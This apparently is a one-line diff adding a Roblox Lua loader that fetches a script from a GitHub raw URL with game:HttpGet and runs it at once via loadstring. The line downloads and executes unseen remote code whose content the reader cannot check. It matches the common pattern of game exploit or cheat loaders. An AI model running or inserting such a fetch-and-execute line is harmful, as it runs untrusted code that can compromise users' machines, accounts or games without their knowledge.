@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HECKE0/CS-1.6/main/2024"))()
